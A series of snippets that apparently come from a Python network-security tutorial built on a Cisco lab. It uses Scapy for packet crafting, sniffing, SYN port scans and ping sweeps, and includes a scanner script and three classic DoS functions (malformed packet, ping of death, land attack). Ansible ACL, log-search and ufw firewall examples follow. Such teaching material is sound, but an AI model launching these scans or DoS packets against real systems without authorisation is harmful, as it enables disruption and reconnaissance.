["```py\n interface Ethernet2/1\n description to iosv-1\n no switchport\n mac-address fa16.3e00.0001\n ip address 10.0.0.6/30\n ip router ospf 1 area 0.0.0.0\n no shutdown\n\n interface Ethernet2/2\n description to Client\n no switchport\n mac-address fa16.3e00.0002\n ip address 10.0.0.9/30\n ip router ospf 1 area 0.0.0.0\n no shutdown\n\n nx-osv-1# sh ip route\n <skip>\n 10.0.0.12/30, ubest/mbest: 1/0\n *via 10.0.0.5, Eth2/1, [110/41], 04:53:02, ospf-1, intra\n 192.168.0.2/32, ubest/mbest: 1/0\n *via 10.0.0.5, Eth2/1, [110/41], 04:53:02, ospf-1, intra\n <skip>\n```", "```py\nnx-osv-1# sh ip ospf neighbors\n OSPF Process ID 1 VRF default\n Total number of neighbors: 1\n Neighbor ID Pri State Up Time Address Interface\n 192.168.0.2 1 FULL/DR 04:53:00 10.0.0.5 Eth2/1\n\nnx-osv-1# sh ip bgp summary\nBGP summary information for VRF default, address family IPv4 Unicast\nBGP router identifier 192.168.0.1, local AS number 1\nBGP table version is 5, IPv4 Unicast config peers 1, capable peers 1\n2 network entries and 2 paths using 288 bytes of memory\nBGP attribute entries [2/288], BGP AS path entries [0/0]\nBGP community entries [0/0], BGP clusterlist entries [0/0]\n\nNeighbor V AS MsgRcvd MsgSent TblVer InQ OutQ Up/Down State/PfxRcd\n192.168.0.2 4 1 321 297 5 0 0 04:52:56 1\n```", "```py\ncisco@Server:~$ lsb_release -a\nNo LSB modules are available.\nDistributor ID: Ubuntu\nDescription: Ubuntu 14.04.2 LTS\nRelease: 14.04\nCodename: trusty\n```", "```py\ncisco@Client:~$ route -n\nKernel IP routing table\nDestination Gateway Genmask Flags Metric Ref Use Iface\n0.0.0.0 172.16.1.2 0.0.0.0 UG 0 0 0 eth0\n10.0.0.4 10.0.0.9 255.255.255.252 UG 0 0 0 eth1\n10.0.0.8 0.0.0.0 255.255.255.252 U 0 0 0 eth1\n10.0.0.8 10.0.0.9 255.255.255.248 UG 0 0 0 eth1\n172.16.1.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0\n192.168.0.1 10.0.0.9 255.255.255.255 UGH 0 0 0 eth1\n192.168.0.2 10.0.0.9 255.255.255.255 UGH 0 0 0 eth1\n```", "```py\n## Our server IP is 10.0.0.14 cisco@Server:~$ ifconfig\n<skip>\neth1 Link encap:Ethernet HWaddr fa:16:3e:d6:83:02\n inet addr:10.0.0.14 Bcast:10.0.0.15 Mask:255.255.255.252\n\n## From the client ping toward server\ncisco@Client:~$ ping -c 1 10.0.0.14\nPING 10.0.0.14 (10.0.0.14) 56(84) bytes of data.\n64 bytes from 10.0.0.14: icmp_seq=1 ttl=62 time=6.22 ms\n\n--- 10.0.0.14 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 6.223/6.223/6.223/0.000 ms\n\n## Traceroute from client to server\ncisco@Client:~$ traceroute 10.0.0.14\ntraceroute to 10.0.0.14 (10.0.0.14), 30 hops max, 60 byte packets\n 1 10.0.0.9 (10.0.0.9) 11.335 ms 11.745 ms 12.113 ms\n 2 10.0.0.5 (10.0.0.5) 24.221 ms 41.635 ms 41.638 ms\n 3 10.0.0.14 (10.0.0.14) 37.916 ms 38.275 ms 38.588 ms\ncisco@Client:~$\n```", "```py\ncisco@Client:~$ sudo apt-get update\ncisco@Client:~$ sudo apt-get install git\ncisco@Client:~$ git clone https://github.com/secdev/scapy\ncisco@Client:~$ cd scapy/\ncisco@Client:~/scapy$ sudo python setup.py install\n```", "```py\ncisco@Client:~/scapy$ python\nPython 2.7.6 (default, Mar 22 2014, 22:59:56)\n[GCC 4.8.2] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> from scapy.all import *\n```", "```py\n## Client Side\ncisco@Client:~/scapy$ sudo scapy\n<skip>\nWelcome to Scapy (2.3.3.dev274)\n>>> send(IP(dst=\"10.0.0.14\")/ICMP())\n.\nSent 1 packets.\n>>>\n\n## Server Side\ncisco@Server:~$ sudo tcpdump -i eth1 host 10.0.0.10\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes\n02:45:16.400162 IP 10.0.0.10 > 10.0.0.14: ICMP echo request, id 0, seq 0, length 8\n02:45:16.400192 IP 10.0.0.14 > 10.0.0.10: ICMP echo reply, id 0, seq 0, length 8\n```", "```py\n>>> p = sr1(IP(dst=\"10.0.0.14\")/ICMP())\n>>> p\n<IP version=4L ihl=5L tos=0x0 len=28 id=26713 flags= frag=0L ttl=62 proto=icmp chksum=0x71 src=10.0.0.14 dst=10.0.0.10 options=[] |<ICMP type=echo-reply code=0 chksum=0xffff id=0x0 seq=0x0 |>>\n```", "```py\n>>> p = sr(IP(dst=\"10.0.0.14\")/ICMP()) \n>>> type(p)\n<type 'tuple'>\n\n## unpacking\n>>> ans,unans = sr(IP(dst=\"10.0.0.14\")/ICMP())\n>>> type(ans)\n<class 'scapy.plist.SndRcvList'>\n>>> type(unans)\n<class 'scapy.plist.PacketList'>\n```", "```py\n>>> for i in ans:\n...     print(type(i))\n...\n<type 'tuple'>\n>>> for i in ans:\n...     print i\n...\n(<IP frag=0 proto=icmp dst=10.0.0.14 |<ICMP |>>, <IP version=4L ihl=5L tos=0x0 len=28 id=27062 flags= frag=0L ttl=62 proto=icmp chksum=0xff13 src=10.0.0.14 dst=10.0.0.10 options=[] |<ICMP type=echo-reply code=0 chksum=0xffff id=0x0 seq=0x0 |>>)\n```", "```py\n>>> p = sr1(IP(dst=\"8.8.8.8\")/UDP()/DNS(rd=1,qd=DNSQR(qname=\"www.google.com\")))\n>>> p\n<IP version=4L ihl=5L tos=0x0 len=76 id=21743 flags= frag=0L ttl=128 proto=udp chksum=0x27fa src=8.8.8.8 dst=172.16.1.152 options=[] |<UDP sport=domain dport=domain len=56 chksum=0xc077 |<DNS id=0 qr=1L opcode=QUERY aa=0L tc=0L rd=1L ra=1L z=0L ad=0L cd=0L rcode=ok qdcount=1 ancount=1 nscount=0 arcount=0 qd=<DNSQR qname='www.google.com.' qtype=A qclass=IN |> an=<DNSRR rrname='www.google.com.' type=A rclass=IN ttl=299 rdata='172.217.3.164' |> ns=None ar=None |>>>\n>>>\n```", "```py\n>>> a = sniff(filter=\"icmp and host 172.217.3.164\", count=5)\n>>> a.show()\n0000 Ether / IP / TCP 192.168.225.146:ssh > 192.168.225.1:50862 PA / Raw\n0001 Ether / IP / ICMP 192.168.225.146 > 172.217.3.164 echo-request 0 / Raw\n0002 Ether / IP / ICMP 172.217.3.164 > 192.168.225.146 echo-reply 0 / Raw\n0003 Ether / IP / ICMP 192.168.225.146 > 172.217.3.164 echo-request 0 / Raw\n0004 Ether / IP / ICMP 172.217.3.164 > 192.168.225.146 echo-reply 0 / Raw\n>>>\n```", "```py\n>>> for i in a:\n...     print i.show()\n...\n<skip>\n###[ Ethernet ]###\n dst= <>\n src= <>\n type= 0x800\n###[ IP ]###\n version= 4L\n ihl= 5L\n tos= 0x0\n len= 84\n id= 15714\n flags= DF\n frag= 0L\n ttl= 64\n proto= icmp\n chksum= 0xaa8e\n src= 192.168.225.146\n dst= 172.217.3.164\n options\n###[ ICMP ]###\n type= echo-request\n code= 0\n chksum= 0xe1cf\n id= 0xaa67\n seq= 0x1\n###[ Raw ]###\n load= 'xd6xbfxb1Xx00x00x00x00x1axdcnx00x00x00x00x00x10x11x12x13x14x15x16x17x18x19x1ax1bx1cx1dx1ex1f !\"#$%&'()*+,-./01234567'\nNone\n```", "```py\n>>> p = sr1(IP(dst=\"10.0.0.14\")/TCP(sport=666,dport=23,flags=\"S\"))\n>>> p.show()\n###[ IP ]###\n version= 4L\n ihl= 5L\n tos= 0x0\n len= 40\n id= 25373\n flags= DF\n frag= 0L\n ttl= 62\n proto= tcp\n chksum= 0xc59b\n src= 10.0.0.14\n dst= 10.0.0.10\n options\n###[ TCP ]###\n sport= telnet\n dport= 666\n seq= 0\n ack= 1\n dataofs= 5L\n reserved= 0L\n flags= RA\n window= 0\n chksum= 0x9907\n urgptr= 0\n options= {}\n```", "```py\n>>> p = sr1(IP(dst=\"10.0.0.14\")/TCP(sport=666,dport=22,flags=\"S\"))\n>>> p.show()\n###[ IP ]###\n version= 4L\n<skip>\n proto= tcp\n chksum= 0x28b5\n src= 10.0.0.14\n dst= 10.0.0.10\n options\n###[ TCP ]###\n sport= ssh\n dport= 666\n<skip>\n flags= SA\n<skip>\n```", "```py\n>>> ans,unans = sr(IP(dst=\"10.0.0.14\")/TCP(sport=666,dport=(20,22),flags=\"S\"))\n>>> for i in ans:\n...     print i\n...\n(<IP frag=0 proto=tcp dst=10.0.0.14 |<TCP sport=666 dport=ftp_data flags=S |>>, <IP version=4L ihl=5L tos=0x0 len=40 id=4126 flags=DF frag=0L ttl=62 proto=tcp chksum=0x189b src=10.0.0.14 dst=10.0.0.10 options=[] |<TCP sport=ftp_data dport=666 seq=0 ack=1 dataofs=5L reserved=0L flags=RA window=0 chksum=0x990a urgptr=0 |>>)\n(<IP frag=0 proto=tcp dst=10.0.0.14 |<TCP sport=666 dport=ftp flags=S |>>, <IP version=4L ihl=5L tos=0x0 len=40 id=4127 flags=DF frag=0L ttl=62 proto=tcp chksum=0x189a src=10.0.0.14 dst=10.0.0.10 options=[] |<TCP sport=ftp dport=666 seq=0 ack=1 dataofs=5L reserved=0L flags=RA window=0 chksum=0x9909 urgptr=0 |>>)\n(<IP frag=0 proto=tcp dst=10.0.0.14 |<TCP sport=666 dport=ssh flags=S |>>, <IP version=4L ihl=5L tos=0x0 len=44 id=0 flags=DF frag=0L ttl=62 proto=tcp chksum=0x28b5 src=10.0.0.14 dst=10.0.0.10 options=[] |<TCP sport=ssh dport=666 seq=4187384571 ack=1 dataofs=6L reserved=0L flags=SA window=29200 chksum=0xaaab urgptr=0 options=[('MSS', 1460)] |>>)\n>>>\n```", "```py\n>>> ans,unans = sr(IP(dst=\"10.0.0.8/29\")/TCP(sport=666,dport=(22),flags=\"S\"))\n>>> for i in ans:\n...     print(i)\n...\n(<IP frag=0 proto=tcp dst=10.0.0.9 |<TCP sport=666 dport=ssh flags=S |>>, <IP version=4L ihl=5L tos=0x0 len=44 id=7304 flags= frag=0L ttl=64 proto=tcp chksum=0x4a32 src=10.0.0.9 dst=10.0.0.10 options=[] |<TCP sport=ssh dport=666 seq=541401209 ack=1 dataofs=6L reserved=0L flags=SA window=17292 chksum=0xfd18 urgptr=0 options=[('MSS', 1444)] |>>)\n(<IP frag=0 proto=tcp dst=10.0.0.14 |<TCP sport=666 dport=ssh flags=S |>>, <IP version=4L ihl=5L tos=0x0 len=44 id=0 flags=DF frag=0L ttl=62 proto=tcp chksum=0x28b5 src=10.0.0.14 dst=10.0.0.10 options=[] |<TCP sport=ssh dport=666 seq=4222593330 ack=1 dataofs=6L reserved=0L flags=SA window=29200 chksum=0x6a5b urgptr=0 options=[('MSS', 1460)] |>>)\n(<IP frag=0 proto=tcp dst=10.0.0.13 |<TCP sport=666 dport=ssh flags=S |>>, <IP version=4L ihl=5L tos=0x0 len=44 id=41992 flags= frag=0L ttl=254 proto=tcp chksum=0x4ad src=10.0.0.13 dst=10.0.0.10 options=[] |<TCP sport=ssh dport=666 seq=2167267659 ack=1 dataofs=6L reserved=0L flags=SA window=4128 chksum=0x1252 urgptr=0 options=[('MSS', 536)] |>>)\n```", "```py\n  #!/usr/bin/env python2\n\n  from scapy.all import *\n  import sys\n```", "```py\n  def tcp_scan(destination, dport):\n      ans, unans = sr(IP(dst=destination)/TCP(sport=666,dport=dport,flags=\"S\"))\n      for sending, returned in ans:\n          if 'SA' in str(returned[TCP].flags):\n              return destination + \" port \" + str(sending[TCP].dport) + \" is open\"\n          else:\n              return destination + \" port \" + str(sending[TCP].dport) + \" is not open\"\n```", "```py\n  def main():\n      destination = sys.argv[1]\n      port = int(sys.argv[2])\n      scan_result = tcp_scan(destination, port)\n      print(scan_result)\n\n  if __name__ == \"__main__\":\n      main()\n```", "```py\ncisco@Client:~$ sudo python scapy_tcp_scan_1.py \"10.0.0.14\" 23\n<skip>\n10.0.0.14 port 23 is not open\ncisco@Client:~$ sudo python scapy_tcp_scan_1.py \"10.0.0.14\" 22\n<skip>\n10.0.0.14 port 22 is open\n```", "```py\n#!/usr/bin/env python2\n\nfrom scapy.all import *\n\ndef icmp_ping(destination):\n    # regular ICMP ping\n    ans, unans = sr(IP(dst=destination)/ICMP())\n    return ans\n\ndef tcp_ping(destination, dport):\n    # TCP SYN Scan\n    ans, unans = sr(IP(dst=destination)/TCP(dport=dport,flags=\"S\"))\n    return ans\n\ndef udp_ping(destination):\n    # ICMP Port unreachable error from closed port\n    ans, unans = sr(IP(dst=destination)/UDP(dport=0))\n    return ans\n```", "```py\ndef answer_summary(answer_list):\n # example of lambda with pretty print\n    answer_list.summary(lambda(s, r): r.sprintf(\"%IP.src% is alive\"))\n```", "```py\ndef main():\n    print(\"** ICMP Ping **\")\n    ans = icmp_ping(\"10.0.0.13-14\")\n    answer_summary(ans)\n    print(\"** TCP Ping **\")\n    ans = tcp_ping(\"10.0.0.13\", 22)\n    answer_summary(ans)\n    print(\"** UDP Ping **\")\n    ans = udp_ping(\"10.0.0.13-14\")\n    answer_summary(ans)\n\nif __name__ == \"__main__\":\n    main()\n```", "```py\ndef malformed_packet_attack(host):\n    send(IP(dst=host, ihl=2, version=3)/ICMP()) \n```", "```py\ndef ping_of_death_attack(host):\n    # https://en.wikipedia.org/wiki/Ping_of_death\n    send(fragment(IP(dst=host)/ICMP()/(\"X\"*60000)))\n```", "```py\n  def land_attack(host):\n      # https://en.wikipedia.org/wiki/Denial-of-service_attack\n      send(IP(src=host, dst=host)/TCP(sport=135,dport=135))\n```", "```py\n[nxosv-devices]\nnx-osv-1 ansible_host=172.16.1.155 ansible_username=cisco ansible_password=cisco\n```", "```py\n---\n- name: Configure Access List\n  hosts: \"nxosv-devices\"\n  gather_facts: false\n  connection: local\n\n  vars:\n    cli:\n      host: \"{{ ansible_host }}\"\n      username: \"{{ ansible_username }}\"\n      password: \"{{ ansible_password }}\"\n      transport: cli\n```", "```py\ntasks:\n  - nxos_acl:\n      name: border_inbound\n      seq: 20\n      action: deny\n      proto: tcp\n      src: 172.16.0.0/12\n      dest: any\n      log: enable\n      state: present\n      provider: \"{{ cli }}\"\n  - nxos_acl:\n      name: border_inbound\n      seq: 40\n      action: permit\n      proto: tcp\n      src: any\n      dest: 10.0.0.14/32\n      dest_port_op: eq\n      dest_port1: 22\n      state: present\n      log: enable\n      provider: \"{{ cli }}\"\n  - nxos_acl:\n      name: border_inbound\n      seq: 50\n      action: permit\n      proto: tcp\n      src: any\n      dest: 10.0.0.14/32\n      dest_port_op: eq\n      dest_port1: 80\n      state: present\n      log: enable\n      provider: \"{{ cli }}\"\n  - nxos_acl:\n      name: border_inbound\n      seq: 60\n      action: permit\n      proto: tcp\n      src: any\n      dest: any\n      state: present\n      log: enable\n      established: enable\n      provider: \"{{ cli }}\"\n  - nxos_acl:\n      name: border_inbound\n      seq: 1000\n      action: deny\n      proto: ip\n      src: any\n      dest: any\n      state: present\n      log: enable\n      provider: \"{{ cli }}\"\n```", "```py\n- name: apply ingress acl to Ethernet 2/2\n  nxos_acl_interface:\n    name: border_inbound\n    interface: Ethernet2/2\n    direction: ingress\n    state: present\n    provider: \"{{ cli }}\"\n```", "```py\n<skip>\n  tasks:\n    - name: Deny Hosts with vendor id fa16.3e00.0000\n      ios_config:\n        lines:\n          - access-list 700 deny fa16.3e00.0000 0000.00FF.FFFF\n          - access-list 700 permit 0000.0000.0000 FFFF.FFFF.FFFF\n        provider: \"{{ cli }}\"\n    - name: Apply filter on bridge group 1\n      ios_config:\n        lines:\n          - bridge-group 1\n          - bridge-group 1 input-address-list 700\n        parents:\n          - interface GigabitEthernet0/1\n        provider: \"{{ cli }}\"   \n```", "```py\n$ wc -l sample_log_anonymized.log\n65102 sample_log_anonymized.log\n```", "```py\n2014 Jun 29 19:20:57 Nexus-7000 %VSHD-5-VSHD_SYSLOG_CONFIG_I: Configured from vty by admin on console0\n2014 Jun 29 19:21:18 Nexus-7000 %ACLLOG-5-ACLLOG_FLOW_INTERVAL: Src IP: 10.1 0.10.1,\n Dst IP: 172.16.10.10, Src Port: 0, Dst Port: 0, Src Intf: Ethernet4/1, Pro tocol: \"ICMP\"(1), Hit-count = 2589\n2014 Jun 29 19:26:18 Nexus-7000 %ACLLOG-5-ACLLOG_FLOW_INTERVAL: Src IP: 10.1 0.10.1, Dst IP: 172.16.10.10, Src Port: 0, Dst Port: 0, Src Intf: Ethernet4/1, Pro tocol: \"ICMP\"(1), Hit-count = 4561\n```", "```py\n#!/usr/bin/env python3\n\nimport re, datetime\n\nstartTime = datetime.datetime.now()\n\nwith open('sample_log_anonymized.log', 'r') as f:\n   for line in f.readlines():\n       if re.search('ACLLOG-5-ACLLOG_FLOW_INTERVAL', line):\n           print(line)\n\nendTime = datetime.datetime.now()\nelapsedTime = endTime - startTime\nprint(\"Time Elapsed: \" + str(elapsedTime))\n```", "```py\n$ python3 python_re_search_1.py\n2014 Jun 29 19:21:18 Nexus-7000 %ACLLOG-5-ACLLOG_FLOW_INTERVAL: Src IP: 10.1 0.10.1,\n\n2014 Jun 29 19:26:18 Nexus-7000 %ACLLOG-5-ACLLOG_FLOW_INTERVAL: Src IP: 10.1 0.10.1,\n\nTime Elapsed: 0:00:00.065436\n```", "```py\nsearchTerm = re.compile('ACLLOG-5-ACLLOG_FLOW_INTERVAL')\n\nwith open('sample_log_anonymized.log', 'r') as f:\n   for line in f.readlines():\n       if re.search(searchTerm, line):\n           print(line)\n```", "```py\nTime Elapsed: 0:00:00.081541\n```", "```py\n$ cp sample_log_anonymized.log sample_log_anonymized_1.log\n```", "```py\nterm1 = re.compile('ACLLOG-5-ACLLOG_FLOW_INTERVAL')\nterm2 = re.compile('PAM: Authentication failure')\n\nfileList = ['sample_log_anonymized.log', 'sample_log_anonymized_1.log']\n\nfor log in fileList:\n    with open(log, 'r') as f:\n       for line in f.readlines():\n           if re.search(term1, line) or re.search(term2, line):\n               print(line) \n```", "```py\n$ python3 python_re_search_2.py\n2016 Jun 5 16:49:33 NEXUS-A %DAEMON-3-SYSTEM_MSG: error: PAM: Authentication failure for illegal user AAA from 172.16.20.170 - sshd[4425]\n\n2016 Sep 14 22:52:26.210 NEXUS-A %DAEMON-3-SYSTEM_MSG: error: PAM: Authentication failure for illegal user AAA from 172.16.20.170 - sshd[2811]\n\n<skip>\n\n2014 Jun 29 19:21:18 Nexus-7000 %ACLLOG-5-ACLLOG_FLOW_INTERVAL: Src IP: 10.1 0.10.1,\n\n2014 Jun 29 19:26:18 Nexus-7000 %ACLLOG-5-ACLLOG_FLOW_INTERVAL: Src IP: 10.1 0.10.1,\n\n<skip>\n\nTime Elapsed: 0:00:00.330697\n```", "```py\n$ sudo apt-get install ufw\n$ sudo ufw status\n$ sudo ufw default outgoing\n$ sudo ufw allow 22/tcp\n$ sudo ufw allow www\n$ sudo ufw default deny incoming\n```", "```py\n$ sudo ufw status verbose\nStatus: active\nLogging: on (low)\nDefault: deny (incoming), allow (outgoing), disabled (routed)\nNew profiles: skip\n\nTo Action From\n-- ------ ----\n22/tcp ALLOW IN Anywhere\n80/tcp ALLOW IN Anywhere\n22/tcp (v6) ALLOW IN Anywhere (v6)\n80/tcp (v6) ALLOW IN Anywhere (v6)\n```"]